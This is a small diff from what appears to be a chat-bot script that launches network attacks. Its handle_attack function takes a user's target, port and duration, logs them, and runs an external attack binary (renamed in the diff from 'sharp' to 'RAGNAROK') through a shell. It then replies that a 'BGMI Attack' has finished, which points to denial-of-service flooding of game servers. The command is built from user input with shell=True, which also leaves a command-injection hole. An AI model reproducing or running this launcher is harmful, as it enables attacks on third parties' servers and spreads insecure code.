@@ -324,7 +324,7 @@ def handle_attack(message):
                 record_command_logs(user_id, target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                full_command = f"./sharp {target} {port} {time} 877"
+                full_command = f"./RAGNAROK {target} {port} {time} 877"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
